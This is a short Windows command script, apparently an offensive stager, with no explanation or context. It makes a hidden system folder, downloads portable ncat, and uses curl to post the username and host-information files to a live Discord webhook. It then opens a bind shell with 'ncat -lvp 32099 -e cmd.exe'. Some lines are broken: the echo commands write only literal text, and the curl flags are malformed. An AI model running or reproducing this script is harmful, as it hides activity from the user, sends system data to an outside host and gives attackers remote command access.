mkdir %userprofile%\desktop\bb
attrib +s +h +i +x %userprofile%\desktop\bb
curl -o -l https://github.com/l-urk/netcat/blob/main/ncat-portable-5.59BETA1.zip %userprofile%\desktop\bb\ncat-portable-5.59BETA1.zip
tar -xf %userprofile%\desktop\bb\ncat-portable-5.59BETA1.zip
echo systeminfo >> %userprofile%\desktop\bb\systeminfo.txt
echo arp -a >> %userprofile%\desktop\bb\arp.txt
for /f "delims=" %n in ('whoami') do set name=%n
curl -F "content=%name%" -F "file=@%userprofile%\desktop\bb\systeminfo.txt" https://discord.com/api/webhooks/1262672146023579688/wigGk1ftp-HwJHiwQ1cIAmCuG7hhtYDHwMeAKiWZ58qdMyZBfHgf0bi_cDfPYQjhLbQ7
curl -F "content=%name%" -F "file=@%userprofile%\desktop\bb\arp.txt"        https://discord.com/api/webhooks/1262672146023579688/wigGk1ftp-HwJHiwQ1cIAmCuG7hhtYDHwMeAKiWZ58qdMyZBfHgf0bi_cDfPYQjhLbQ7
%userprofile%\desktop\bb\ncat-portable-5.59BETA1\ncat.exe -lvp 32099 -e cmd.exe
pause
